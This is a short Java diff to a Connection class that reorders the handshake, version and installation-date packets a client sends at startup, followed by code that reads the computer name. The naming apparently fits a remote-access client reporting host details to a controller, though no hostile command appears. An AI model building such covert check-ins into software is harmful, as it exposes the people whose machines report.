@@ -97,8 +97,6 @@ public class Connection implements Runnable {
 									
 			Main.encryption = inputStream.read() == 1;
 
-			addToSendQueue(new Packet1InitHandshake());
-
 			initialize();
 
 			status(Constants.STATUS_READY);
@@ -129,9 +127,11 @@ public class Connection implements Runnable {
 	}
 
 	public static void initialize() throws Exception {
-		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
-
 		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
+		
+		addToSendQueue(new Packet1InitHandshake());
+
+		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
 		String computerName;
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
